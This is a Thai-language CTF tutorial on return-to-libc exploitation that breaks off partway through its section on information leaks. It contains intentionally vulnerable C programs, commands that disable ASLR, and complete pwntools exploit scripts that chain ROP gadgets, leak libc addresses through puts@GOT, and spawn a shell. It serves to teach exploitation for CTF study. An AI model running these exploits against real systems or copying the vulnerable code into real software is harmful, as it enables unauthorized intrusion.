# Part 072: Return-to-libc Attack (Educational)

> **คำเตือน / Disclaimer**: เนื้อหานี้จัดทำขึ้นเพื่อการศึกษาและการแข่งขัน CTF (Capture The Flag) เท่านั้น  
> การนำไปใช้โจมตีระบบที่ไม่ได้รับอนุญาตเป็นสิ่งผิดกฎหมาย  
> This content is for educational purposes and CTF competitions only.  
> Using these techniques against unauthorized systems is illegal.

---

## สารบัญ / Table of Contents

1. [NX/DEP Protection คืออะไร](#1-nxdep-protection-คืออะไร)
2. [แนวคิด Return-to-libc](#2-แนวคิด-return-to-libc)
3. [โครงสร้างหน่วยความจำที่เกี่ยวข้อง](#3-โครงสร้างหน่วยความจำที่เกี่ยวข้อง)
4. [การหาที่อยู่ system() ใน libc](#4-การหาที่อยู่-system-ใน-libc)
5. [การหา "/bin/sh" ใน libc](#5-การหา-binsh-ใน-libc)
6. [32-bit Return-to-libc](#6-32-bit-return-to-libc)
7. [64-bit Return-to-libc และ ROP Gadgets](#7-64-bit-return-to-libc-และ-rop-gadgets)
8. [ret2plt Technique](#8-ret2plt-technique)
9. [ASLR และการ Bypass](#9-aslr-และการ-bypass)
10. [Information Leak: puts(got_entry)](#10-information-leak-putsgot_entry)
11. [Libc Database](#11-libc-database)
12. [one_gadget](#12-one_gadget)
13. [Environment Variable Approach (32-bit)](#13-environment-variable-approach-32-bit)
14. [Return-to-main สำหรับหลาย Pass](#14-return-to-main-สำหรับหลาย-pass)
15. [pwntools: เครื่องมือสำหรับ Exploitation](#15-pwntools-เครื่องมือสำหรับ-exploitation)
16. [ตัวอย่าง CTF แบบสมบูรณ์](#16-ตัวอย่าง-ctf-แบบสมบูรณ์)
17. [การป้องกัน (Defense)](#17-การป้องกัน-defense)
18. [แบบฝึกหัดและโจทย์](#18-แบบฝึกหัดและโจทย์)

---

## 1. NX/DEP Protection คืออะไร

### 1.1 ปัญหาของ Shellcode แบบดั้งเดิม

ในอดีต การโจมตีด้วย Buffer Overflow ทำโดยการวาง shellcode ลงใน stack แล้ว return ไปยัง shellcode นั้น:

```
Stack ก่อน overflow:
+------------------+
| Local Variables  |
| Buffer           |
| Saved RBP        |
| Return Address   |  <-- ชี้ไปที่ shellcode ใน stack
| ...              |
+------------------+

หลัง overflow:
+------------------+
| \x90\x90\x90...  |  <-- NOP sled
| shellcode        |  <-- โค้ดที่เราต้องการรัน
| AAAAAAAA         |  <-- padding
| [stack address]  |  <-- return address ถูกเขียนทับ
+------------------+
```

เทคนิคนี้ง่ายมากและได้ผลดีในยุค 1990s-2000s

### 1.2 NX (No-Execute) และ DEP (Data Execution Prevention)

**NX bit** (No-eXecute) คือ feature ของ CPU hardware ที่ทำให้แต่ละ memory page สามารถถูกกำหนดสิทธิ์ได้:
- **Read (R)**: อ่านได้
- **Write (W)**: เขียนได้  
- **Execute (X)**: รันโค้ดได้

**กฎสำคัญ**: ถ้า page ถูก mark ว่า non-executable แล้วพยายาม jump ไปที่นั่น CPU จะ raise exception

**DEP** (Data Execution Prevention) คือ implementation ของ NX ใน Windows

### 1.3 ผลกระทบต่อ Stack

เมื่อเปิด NX/DEP:
```
Memory Layout:
+------------------+ 
| .text section    |  R-X  (executable, read-only)
+------------------+
| .data section    |  RW-  (readable, writable, NOT executable)
+------------------+
| heap             |  RW-  (readable, writable, NOT executable)
+------------------+
| stack            |  RW-  (readable, writable, NOT executable)
+------------------+
| libc.so          |  R-X  (executable, read-only)
+------------------+
```

เมื่อ stack ไม่ executable อีกต่อไป shellcode บน stack ก็รันไม่ได้!

### 1.4 ตรวจสอบ NX ด้วย checksec

```bash
# ติดตั้ง checksec
sudo apt install checksec
# หรือใช้ pwntools
python3 -c "from pwn import *; e=ELF('./binary'); print(e.checksec)"

# ตรวจสอบ binary
checksec --file=./vulnerable_binary

# ผลลัพธ์ตัวอย่าง:
[*] '/path/to/binary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled          <-- NX เปิดอยู่
    PIE:      No PIE (0x400000)
```

### 1.5 Compile ด้วย/ไม่มี NX

```bash
# ปิด NX (เพื่อการทดสอบ)
gcc -z execstack -o vuln vuln.c

# เปิด NX (default)
gcc -o vuln vuln.c

# ตรวจสอบด้วย readelf
readelf -l vuln | grep GNU_STACK
# GNU_STACK ที่มี RWE = NX ปิด
# GNU_STACK ที่มี RW  = NX เปิด
```

---

## 2. แนวคิด Return-to-libc

### 2.1 แนวคิดหลัก: Call Existing Code

Return-to-libc (ret2libc) คือเทคนิคที่แทนที่จะ inject shellcode เราจะ **redirect execution ไปยังโค้ดที่มีอยู่แล้ว** ในหน่วยความจำ

**แนวคิดหลัก**: แทนที่จะรัน shellcode ของเรา เราจะใช้ฟังก์ชัน `system("/bin/sh")` ซึ่งมีอยู่ใน libc แล้ว!

```
แทนที่จะทำ:
  [shellcode] → รัน /bin/sh โดยตรง

เราทำ:
  [return to system()] + [argument "/bin/sh"] → ได้ shell เหมือนกัน
```

### 2.2 ทำไมต้องใช้ libc

libc (C Standard Library) คือ library ที่เกือบทุก Linux program link ด้วย มันมีฟังก์ชันที่เป็นประโยชน์:
- `system(cmd)` - รัน shell command
- `execve(path, argv, envp)` - execute program
- `mprotect(addr, size, prot)` - เปลี่ยน memory protection
- `open/read/write` - file operations

เนื่องจาก libc ต้องมี executable code เพื่อทำงาน memory ของมันจึงต้อง executable เสมอ!

### 2.3 เปรียบเทียบ Stack Smashing vs ret2libc

```
Traditional Stack Smashing (ต้องการ executable stack):
+----------+     overflow     +----------+
| buffer   | ===============> | shellcode|
| saved RBP|                  | padding  |
| ret addr |                  | &shellcode| <-- กลับไปที่ stack
+----------+                  +----------+

ret2libc (ทำงานแม้ NX เปิดอยู่):
+----------+     overflow     +----------+
| buffer   | ===============> | AAAAAAAA |
| saved RBP|                  | padding  |
| ret addr |                  | &system()| <-- กลับไปที่ libc
| ...      |                  | &exit()  |
+----------+                  | &"/bin/sh"|
                              +----------+
```

### 2.4 ข้อกำหนดเบื้องต้น

ก่อนที่ ret2libc จะทำงานได้เราต้องรู้:
1. **Offset ของ return address** - ต้อง overflow เท่าไหร่ถึง overwrite return address
2. **Address ของ system()** - อยู่ที่ไหนใน memory
3. **Address ของ "/bin/sh"** - string นี้อยู่ที่ไหน
4. **Address ของ exit()** - (สำหรับ 32-bit) เพื่อ clean exit

---

## 3. โครงสร้างหน่วยความจำที่เกี่ยวข้อง

### 3.1 Virtual Memory Layout ของ Linux Process

```
High Address
+------------------+ 0xFFFFFFFFFFFFFFFF
| Kernel Space     |  (ไม่สามารถ access ได้จาก user space)
+------------------+ 0xFFFF800000000000
|                  |
| ...              |
|                  |
+------------------+ 0x7FFFFFFFFFFF
| Stack            |  ↓ grows downward
| [stack frame]    |
| [stack frame]    |
+------------------+
| ...              |
+------------------+
| Shared Libraries |  libc.so อยู่ที่นี่
| (libc, ld, etc.) |
+------------------+
| ...              |
+------------------+
| Heap             |  ↑ grows upward
+------------------+
| BSS Segment      |  uninitialized globals
+------------------+
| Data Segment     |  initialized globals
+------------------+
| Text Segment     |  program code
+------------------+ 0x400000 (no PIE) / random (PIE)
Low Address
```

### 3.2 PLT และ GOT

**PLT** (Procedure Linkage Table) และ **GOT** (Global Offset Table) เป็นกลไกสำคัญของ dynamic linking:

```
Program Binary:
+------------------+
| .text            |  โค้ดหลัก
|   call puts@plt  |  --> ไปที่ PLT
+------------------+
| .plt             |  
|   puts@plt:      |  
|     jmp *puts@got|  --> ไปที่ GOT
+------------------+
| .got.plt         |  
|   puts@got:      |  
|     [address]    |  --> address จริงของ puts ใน libc
+------------------+

libc.so:
+------------------+
| puts()           |  ฟังก์ชันจริง
+------------------+
```

**ครั้งแรกที่เรียก** `puts`: PLT → GOT (ชี้ไป linker) → linker resolve → update GOT → call puts
**ครั้งต่อไป**: PLT → GOT (ชี้ไป puts โดยตรง) → call puts

### 3.3 ดู Memory Map ด้วย /proc

```bash
# ขณะโปรแกรมรันอยู่
cat /proc/[pid]/maps

# ตัวอย่างผลลัพธ์:
400000-401000 r-xp 00000000 08:01 123456    /home/user/vuln      (text)
600000-601000 r--p 00000000 08:01 123456    /home/user/vuln      (rodata)
601000-602000 rw-p 00001000 08:01 123456    /home/user/vuln      (data/bss)
7f8b2c000000-7f8b2c1b9000 r-xp ... /lib/x86_64-linux-gnu/libc-2.31.so
7f8b2c1b9000-7f8b2c3b8000 ---p ... /lib/x86_64-linux-gnu/libc-2.31.so
7f8b2c3b8000-7f8b2c3bc000 r--p ... /lib/x86_64-linux-gnu/libc-2.31.so
7f8b2c3bc000-7f8b2c3be000 rw-p ... /lib/x86_64-linux-gnu/libc-2.31.so
7ffd12345000-7ffd12366000 rw-p 00000000 00:00 0    [stack]
```

---

## 4. การหาที่อยู่ system() ใน libc

### 4.1 วิธีที่ 1: ใช้ gdb

```bash
# เปิด program ด้วย gdb
gdb -q ./vulnerable

# run โปรแกรม
(gdb) r

# หาที่อยู่ system
(gdb) p system
$1 = {<text variable, no debug info>} 0x7f1234567890 <system>

# หรือใช้ info
(gdb) info functions system
All functions matching regular expression "system":

Non-debugging symbols:
0x00007f1234567890  system
```

### 4.2 วิธีที่ 2: ใช้ Python/pwntools

```python
from pwn import *

# โหลด binary
elf = ELF('./vulnerable')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# หา offset ของ system ใน libc
system_offset = libc.sym['system']
print(f"system offset in libc: {hex(system_offset)}")

# ถ้ารู้ libc base address
libc_base = 0x7f1234560000  # ตัวอย่าง
system_addr = libc_base + system_offset
print(f"system address: {hex(system_addr)}")
```

### 4.3 วิธีที่ 3: ใช้ readelf

```bash
# หา offset ของ system ใน libc
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " system"
   233: 0000000000048e50   103 FUNC    GLOBAL DEFAULT   15 system@@GLIBC_2.2.5

# system อยู่ที่ offset 0x48e50 จาก libc base
```

### 4.4 วิธีที่ 4: ใช้ nm

```bash
nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep system
0000000000048e50 T system

# หรือ
nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep " system$"
```

### 4.5 วิธีที่ 5: ผ่านทาง GOT ของโปรแกรม

```bash
# ถ้า program เรียก system โดยตรง
objdump -d ./vulnerable | grep system
# จะเห็น call ไปที่ system@plt

# ดู address ใน GOT หลัง dynamic linking
(gdb) p system
```

### 4.6 คำนวณ Address จาก Base

```python
# libc base address + symbol offset = actual address
# 
# ตัวอย่าง:
# libc base  = 0x7f8b2c000000  (จาก /proc/maps หรือ leak)
# system off = 0x0000000000048e50  (จาก readelf)
# 
# system addr = 0x7f8b2c000000 + 0x48e50
#             = 0x7f8b2c048e50

libc_base = 0x7f8b2c000000
system_offset = 0x48e50
system_addr = libc_base + system_offset
print(hex(system_addr))  # 0x7f8b2c048e50
```

---

## 5. การหา "/bin/sh" ใน libc

### 5.1 ทำไม "/bin/sh" อยู่ใน libc?

libc มี string `/bin/sh` อยู่ภายในเพราะ `system()` ใช้มัน!
โดย `system(cmd)` จะเรียก `/bin/sh -c cmd` ข้างใน

```c
// ภายใน libc source code ของ system():
int system(const char *command) {
    // ...
    execl("/bin/sh", "sh", "-c", command, (char *)0);
    // ...
}
```

ดังนั้น string `/bin/sh` จึงต้องมีอยู่ใน libc!

### 5.2 หา "/bin/sh" ด้วยวิธีต่างๆ

```bash
# วิธีที่ 1: ใช้ strings
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
 1b40fa /bin/sh

# วิธีที่ 2: ใช้ grep
grep -boa "/bin/sh" /lib/x86_64-linux-gnu/libc.so.6
# -b = print byte offset
# -o = only matching

# วิธีที่ 3: ใช้ Python
python3 -c "
data = open('/lib/x86_64-linux-gnu/libc.so.6', 'rb').read()
offset = data.find(b'/bin/sh')
print(hex(offset))
"

# วิธีที่ 4: ใช้ pwntools
python3 -c "
from pwn import *
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
binsh_offset = next(libc.search(b'/bin/sh'))
print(hex(binsh_offset))
"
```

### 5.3 คำนวณ Address จริง

```python
from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# หา offset ของ /bin/sh
binsh_offset = next(libc.search(b'/bin/sh'))
print(f"/bin/sh offset: {hex(binsh_offset)}")

# ถ้ารู้ base address
libc_base = 0x7f8b2c000000
binsh_addr = libc_base + binsh_offset
print(f"/bin/sh address: {hex(binsh_addr)}")
```

### 5.4 ทางเลือกอื่น: "/bin/sh" ใน Environment

```python
# บางครั้งเราสร้าง string เองใน environment variable
import os
os.environ['MYSHELL'] = '/bin/sh'

# หรือผ่าน pwntools
p = process(['./vuln'], env={'MYSHELL': '/bin/sh'})
```

---

## 6. 32-bit Return-to-libc

### 6.1 Calling Convention ของ 32-bit

ใน x86 (32-bit) Linux:
- **Arguments ถูกส่งผ่าน Stack** ไม่ใช่ registers
- ลำดับ: argument แรกอยู่ต่ำกว่า return address

```
Stack layout สำหรับ function call:
+------------------+  High address
| argument n       |
| ...              |
| argument 2       |
| argument 1       |  <-- ส่งผ่าน stack
| return address   |  <-- caller ต้อง push นี้ก่อน call
| saved EBP        |  <-- callee push EBP
| local vars       |
+------------------+  Low address
```

### 6.2 Stack Layout สำหรับ ret2libc 32-bit

เราต้อง setup stack เพื่อ "fake" การ call `system("/bin/sh")`:

```
Stack หลัง overflow:
+------------------+  Higher
| AAAAAAA...       |  padding (เติมจน overflow)
+------------------+
| address of system|  <-- overwrite return address (เรียก system)
+------------------+
| address of exit  |  <-- "return address" สำหรับ system (clean exit)
+------------------+
| address of /bin/sh|  <-- argument ให้ system()
+------------------+  Lower
```

### 6.3 ตัวอย่าง Vulnerable Program (32-bit)

```c
// vuln32.c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
    char buffer[64];
    printf("Enter input: ");
    gets(buffer);  // ช่องโหว่! ไม่ตรวจ size
}

int main() {
    vulnerable_function();
    return 0;
}
```

```bash
# Compile สำหรับ 32-bit ที่มี NX แต่ไม่มี stack canary และ ASLR
gcc -m32 -fno-stack-protector -no-pie -o vuln32 vuln32.c
# ปิด ASLR สำหรับการทดสอบ
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### 6.4 หา Offset ของ Return Address

```bash
# วิธีที่ 1: ใช้ cyclic pattern
python3 -c "
from pwn import *
print(cyclic(200).decode())
" | ./vuln32
# ดู Segfault แล้ว note address ที่ crash

# หรือใน gdb:
(gdb) r <<< $(python3 -c "from pwn import *; print(cyclic(200).decode())")
# Program received signal SIGSEGV
# EIP = 0x61616167 (ตัวอักษร 'gaaa')
(gdb) python3 -c "from pwn import *; print(cyclic_find(0x61616167))"
# 76 <- offset!
```

### 6.5 Exploit Script สำหรับ 32-bit

```python
#!/usr/bin/env python3
# exploit32.py
from pwn import *

# ตั้งค่า
context.arch = 'i386'
context.os = 'linux'

# โหลด binary และ libc
elf = ELF('./vuln32')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# หา addresses (ไม่มี ASLR ตอนนี้)
# วิธีหา libc base: ดูจาก /proc/maps หรือ gdb
libc_base = 0xf7d5a000  # ตัวอย่าง - ต้องหาจริง

# คำนวณ addresses
system_addr = libc_base + libc.sym['system']
exit_addr = libc_base + libc.sym['exit']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

print(f"system @ {hex(system_addr)}")
print(f"exit   @ {hex(exit_addr)}")
print(f"/bin/sh@ {hex(binsh_addr)}")

# สร้าง payload
offset = 76  # จากการทดสอบด้านบน

payload = flat(
    b'A' * offset,          # padding ไปถึง return address
    p32(system_addr),       # overwrite return address ด้วย system
    p32(exit_addr),         # "return address" สำหรับ system
    p32(binsh_addr),        # argument: "/bin/sh"
)

print(f"Payload length: {len(payload)}")

# ส่ง payload
p = process('./vuln32')
p.sendline(payload)
p.interactive()
```

### 6.6 ทดสอบและ Debug

```bash
# รัน exploit
python3 exploit32.py

# ถ้าไม่ได้ shell ให้ debug ด้วย gdb
gdb -q ./vuln32
(gdb) r < <(python3 exploit32.py GENERATE_PAYLOAD)

# ตรวจสอบ stack ขณะ overflow
(gdb) x/20wx $esp
```

### 6.7 การจัดการกับ Buffering

```python
# บางโปรแกรมมีปัญหา buffering ใน pipe
p = process('./vuln32')
p.recvuntil(b'Enter input: ')  # รับ prompt ก่อน
p.sendline(payload)
p.interactive()
```

---

## 7. 64-bit Return-to-libc และ ROP Gadgets

### 7.1 Calling Convention ของ 64-bit

ใน x86-64 (64-bit) Linux (System V AMD64 ABI):
- **Arguments แรก 6 ตัวผ่าน Registers**: `rdi, rsi, rdx, rcx, r8, r9`
- Arguments เพิ่มเติมผ่าน stack

```
สำหรับ system("/bin/sh"):
- argument แรก ("/bin/sh") → ต้องอยู่ใน RDI
- ไม่ต้องใส่ใน stack
```

### 7.2 ทำไม 64-bit ยากกว่า

ปัญหาหลัก: เราไม่สามารถ "วาง argument บน stack" ตรงๆ ได้แบบ 32-bit
เราต้องหาวิธี **โหลด address ของ "/bin/sh" เข้า RDI** ก่อน

วิธีการคือใช้ **ROP Gadget**!

### 7.3 ROP Gadgets คืออะไร

**ROP** (Return-Oriented Programming) คือเทคนิคที่ใช้ "gadgets" ที่มีอยู่ใน memory

**Gadget** = ชุด instructions ขนาดเล็กที่จบด้วย `ret`:

```asm
pop rdi ; ret    ; <- gadget นี้จะ pop ค่าจาก stack → RDI แล้ว return
pop rsi ; ret    ; <- gadget นี้จะ pop ค่าจาก stack → RSI แล้ว return
pop rdx ; ret    ; <- gadget นี้จะ pop ค่าจาก stack → RDX แล้ว return
```

### 7.4 หา Gadget: pop rdi; ret

```bash
# วิธีที่ 1: ใช้ ROPgadget
ROPgadget --binary ./vuln64 | grep "pop rdi"
# 0x00000000004006f3 : pop rdi ; ret

# วิธีที่ 2: ใช้ ropper
ropper -f ./vuln64 --search "pop rdi"
# 0x00000000004006f3: pop rdi; ret; 

# วิธีที่ 3: ใช้ pwntools
from pwn import *
elf = ELF('./vuln64')
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
print(hex(pop_rdi))

# วิธีที่ 4: ใช้ gdb + pwndbg
(gdb) rop --grep "pop rdi"

# วิธีที่ 5: ค้นหา binary ด้วย pwntools
from pwn import *
elf = ELF('./vuln64')
for addr in elf.search(asm('pop rdi; ret')):
    print(hex(addr))
```

### 7.5 Stack Layout สำหรับ 64-bit ret2libc

```
Stack หลัง overflow:
+------------------+  Higher
| AAAAAAA...       |  padding
+------------------+
| &(pop rdi; ret)  |  <-- overwrite return address (gadget address)
+------------------+
| &"/bin/sh"       |  <-- value ที่จะ pop เข้า RDI
+------------------+
| &system          |  <-- หลัง gadget ret จะ jump ที่นี่
+------------------+  Lower

การทำงาน:
1. Function return → jump to (pop rdi; ret)
2. pop rdi: โหลด &"/bin/sh" → RDI
3. ret: jump to system()
4. system() เรียกด้วย RDI = &"/bin/sh" → ได้ shell!
```

### 7.6 ตัวอย่าง Vulnerable Program (64-bit)

```c
// vuln64.c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
    char buffer[64];
    printf("Enter input: ");
    read(0, buffer, 256);  // อ่าน 256 bytes แต่ buffer มีแค่ 64
}

int main() {
    vulnerable_function();
    printf("Done!\n");
    return 0;
}
```

```bash
# Compile
gcc -fno-stack-protector -no-pie -o vuln64 vuln64.c
# ASLR ปิดสำหรับการทดสอบ
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

### 7.7 Exploit Script สำหรับ 64-bit

```python
#!/usr/bin/env python3
# exploit64.py
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# โหลด binary
elf = ELF('./vuln64')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# หา libc base (ไม่มี ASLR)
libc_base = 0x7f8b2c000000  # หาจาก /proc/maps หรือ gdb

# คำนวณ addresses
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))

print(f"system @ {hex(system_addr)}")
print(f"/bin/sh@ {hex(binsh_addr)}")

# หา ROP gadget: pop rdi; ret
rop = ROP(elf)
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
print(f"pop rdi; ret @ {hex(pop_rdi_ret)}")

# บางครั้งต้องการ ret gadget สำหรับ stack alignment
ret_gadget = rop.find_gadget(['ret'])[0]

# offset ไปถึง return address
offset = 72  # buffer(64) + saved_rbp(8) = 72

# สร้าง payload
payload = flat(
    b'A' * offset,          # padding
    p64(pop_rdi_ret),       # gadget: pop rdi; ret
    p64(binsh_addr),        # value → RDI = &"/bin/sh"
    p64(ret_gadget),        # stack alignment (บางครั้งจำเป็น)
    p64(system_addr),       # system("/bin/sh")
)

p = process('./vuln64')
p.recvuntil(b'Enter input: ')
p.sendline(payload)
p.interactive()
```

### 7.8 Stack Alignment Issue

64-bit Linux ต้องการ RSP ที่ aligned 16 bytes ก่อนเรียก system():

```python
# ถ้า system() crash ด้วย signal SIGSEGV หรือ SIGBUS
# ลองเพิ่ม ret gadget เพื่อ align stack:

payload = flat(
    b'A' * offset,
    p64(pop_rdi_ret),
    p64(binsh_addr),
    p64(ret_gadget),        # extra ret สำหรับ alignment
    p64(system_addr),
)

# หรือใช้ p64(ret_gadget) ก่อน system:
# pop_rdi; value; ret; system
```

### 7.9 การหา Offset ด้วย cyclic ใน 64-bit

```bash
# สร้าง cyclic pattern
python3 -c "from pwn import *; print(cyclic(200))" | ./vuln64

# ใน gdb:
(gdb) r < <(python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(200))")
# Program received signal SIGSEGV
# RIP = 0x6161616161616167

# หา offset:
(gdb) python3 -c "from pwn import *; print(cyclic_find(0x6161616161616167))"
# หรือ
python3 -c "from pwn import *; print(cyclic_find(b'gaaa'))"
```

---

## 8. ret2plt Technique

### 8.1 แนวคิด ret2plt

**ret2plt** คือการเรียก PLT entry ของ function แทนที่จะเรียก libc function โดยตรง

**ข้อดี**:
- PLT address คงที่ (ไม่ขึ้นกับ ASLR ถ้า no PIE)
- ใช้ได้เมื่อไม่รู้ libc base
- เหมาะสำหรับการ leak address

### 8.2 PLT vs Direct Call

```
Direct call to libc (ต้องรู้ libc base):
  jump to 0x7f8b2c048e50  (system ใน libc - เปลี่ยนทุก run ถ้า ASLR)

ret2plt (PLT address คงที่ถ้า no PIE):
  jump to puts@plt (0x401030)
  PLT → GOT → libc puts
```

### 8.3 การใช้ puts@plt สำหรับ Leak

```python
# ใช้ puts@plt เรียก puts เพื่อ print ค่าจาก GOT
# ซึ่งจะ leak address จริงของ puts ใน libc

from pwn import *

elf = ELF('./vuln64')
rop = ROP(elf)

# หา PLT ของ puts
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
main_addr = elf.sym['main']

print(f"puts@plt: {hex(puts_plt)}")
print(f"puts@got: {hex(puts_got)}")
print(f"pop rdi;ret: {hex(pop_rdi)}")
print(f"main: {hex(main_addr)}")

# Payload สำหรับ leak:
# 1. เรียก puts(got['puts']) เพื่อ leak address ของ puts ใน libc
# 2. return กลับ main เพื่อ overflow อีกครั้ง
payload_stage1 = flat(
    b'A' * offset,
    p64(pop_rdi),       # pop rdi; ret
    p64(puts_got),      # argument: &puts@got (will print puts's real address)
    p64(puts_plt),      # call puts@plt
    p64(main_addr),     # return to main for second stage
)
```

### 8.4 ข้อดีของ ret2plt

1. **ไม่ต้องรู้ libc base** - เพียงแค่รู้ว่า PLT entry อยู่ที่ไหน (คงที่ถ้า no PIE)
2. **ใช้สำหรับ information leak** - เรียก puts/printf เพื่อ print ค่าจาก memory
3. **ทำงานข้าม ASLR** - เมื่อใช้ร่วมกับ information leak

---

## 9. ASLR และการ Bypass

### 9.1 ASLR คืออะไร

**ASLR** (Address Space Layout Randomization) คือ security feature ที่ randomize addresses ของ:
- Stack
- Heap  
- Shared libraries (libc, ld, etc.)

```bash
# ระดับ ASLR ใน Linux
cat /proc/sys/kernel/randomize_va_space
# 0 = ปิด ASLR
# 1 = randomize stack, mmap, VDSO
# 2 = ทุกอย่าง รวม heap (default)
```

### 9.2 ผลกระทบของ ASLR ต่อ ret2libc

```
ไม่มี ASLR:
  system() อยู่ที่ 0x7f8b2c048e50 ทุก run
  เราใส่ address นี้ใน exploit ได้เลย

มี ASLR:
  Run ที่ 1: system() อยู่ที่ 0x7f1234048e50
  Run ที่ 2: system() อยู่ที่ 0x7f5678048e50  
  Run ที่ 3: system() อยู่ที่ 0x7fabcd048e50
  
  ไม่สามารถ hardcode address ได้!
```

### 9.3 เทคนิค Bypass ASLR: Information Leak

วิธีที่นิยมที่สุดคือ **Information Leak** - ทำให้โปรแกรม "บอก" เราว่า libc อยู่ที่ไหน

```
Strategy:
1. Overflow → เรียก puts(got['puts']) → ได้ puts address จริง
2. คำนวณ libc base = puts_real_addr - puts_offset
3. Overflow อีกครั้ง → ret2libc ด้วย address ที่ถูกต้อง
```

### 9.4 PIE (Position Independent Executable)

ถ้า binary compiled with PIE ด้วย:
```bash
checksec --file=vuln
# PIE: PIE enabled   <-- แปลว่า binary เองก็ random
```

เมื่อ PIE เปิด:
- PLT, GOT, .text ทุกอย่างใน binary ก็ random ด้วย
- ต้องเพิ่ม step ในการ leak binary base address

### 9.5 Brute Force ASLR (32-bit)

ใน 32-bit:
- Address space เล็กกว่า (32 bits)
- ASLR randomize แค่บางส่วนของ address
- สามารถ brute force ได้ (มีโอกาสถูก ~1/1000)

```python
# ตัวอย่าง brute force ASLR (32-bit เท่านั้น! ไม่ practical สำหรับ 64-bit)
from pwn import *

libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# ลองหลาย libc base addresses
for guess in range(0xf7000000, 0xf8000000, 0x1000):
    system_addr = guess + libc.sym['system']
    binsh_addr = guess + next(libc.search(b'/bin/sh'))
    
    p = process('./vuln32')
    try:
        # ส่ง exploit
        # ถ้า return code = 0 → สำเร็จ
        pass
    except:
        p.close()
        continue
```

---

## 10. Information Leak: puts(got_entry)

### 10.1 แนวคิด Leak

เราใช้ `puts()` เพื่อ print binary data จาก memory โดยเฉพาะ GOT entries

```
puts(ptr) จะ print ทุก byte จาก ptr จนถึง null byte (0x00)
ถ้า ptr ชี้ไปที่ GOT entry → เราจะได้ address ของ library function!
```

### 10.2 Two-Stage Exploit

```
Stage 1 (Leak):
  overflow → pop rdi; ret → got['puts'] → puts@plt → main()
  ผล: โปรแกรม print address ของ puts ใน libc แล้ว return กลับ main

Stage 2 (Shell):
  overflow อีกครั้ง → pop rdi; ret → &"/bin/sh" → system()
  ผล: ได้ shell!
```

### 10.3 ตัวอย่าง Vulnerable Program

```c
// vuln_aslr.c - มี ASLR ทำงาน
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void setup() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

void vulnerable() {
    char buffer[128];
    printf("Tell me something: ");
    read(0, buffer, 512);  // overflow!
}

int main() {
    setup();
    vulnerable();
    puts("Thanks!");
    return 0;
}
```

```bash
# Compile พร้อม PIE ปิด แต่ ASLR เปิด
gcc -fno-stack-protector -no-pie -o vuln_aslr vuln_aslr.c
# ASLR เปิด (default) - ไม่ต้องปิด
```

### 10.4 Exploit Script แบบสมบูรณ์

```python
#!/usr/bin/env python3
# exploit_aslr.py - bypass ASLR ด้วย information leak
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# โหลด binary และ libc
elf = ELF('./vuln_aslr')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# ค่าที่ต้องการ
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.sym['main']

print(f"puts@plt: {hex(puts_plt)}")
print(f"puts@got: {hex(puts_got)}")
print(f"main:     {hex(main_addr)}")

# หา ROP gadgets
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]
print(f"pop rdi;ret: {hex(pop_rdi)}")

# offset
offset = 136  # buffer(128) + saved_rbp(8)

def exploit(p):
    # ============ STAGE 1: LEAK ============
    print("[*] Stage 1: Leaking libc address...")
    
    payload1 = flat(
        b'A' * offset,      # padding
        p64(pop_rdi),       # pop rdi; ret
        p64(puts_got),      # rdi = puts@got (address ของ puts จริงๆ)
        p64(puts_plt),      # call puts@plt → prints puts's real address
        p64(main_addr),     # return to main for stage 2
    )
    
    p.recvuntil(b'Tell me something: ')
    p.sendline(payload1)
    p.recvuntil(b'Thanks!\n')
    
    # รับ leaked address
    leak = u64(p.recvline().strip().ljust(8, b'\x00'))
    print(f"[+] Leaked puts address: {hex(leak)}")
    
    # คำนวณ libc base
    libc_base = leak - libc.sym['puts']
    print(f"[+] libc base: {hex(libc_base)}")
    
    # คำนวณ addresses ที่ต้องการ
    system_addr = libc_base + libc.sym['system']
    binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
    
    print(f"[+] system: {hex(system_addr)}")
    print(f"[+] /bin/sh: {hex(binsh_addr)}")
    
    # ============ STAGE 2: SHELL ============
    print("[*] Stage 2: Getting shell...")
    
    payload2 = flat(
        b'A' * offset,      # padding
        p64(pop_rdi),       # pop rdi; ret
        p64(binsh_addr),    # rdi = &"/bin/sh"
        p64(ret_gadget),    # stack alignment
        p64(system_addr),   # system("/bin/sh")
    )
    
    p.recvuntil(b'Tell me something: ')
    p.sendline(payload2)
    
    print("[+] Shell should be incoming!")
    p.interactive()

# รัน exploit
p = process('./vuln_aslr')
exploit(p)
```

### 10.5 การจัดการกับ Null Bytes ใน Leaked Address

```python
# puts จะหยุดที่ null byte
# ถ้า address มี null byte: 0x7f00abcd0000
# puts จะ print แค่ b'\x00' (หรือน้อยกว่า)

def recv_leak(p):
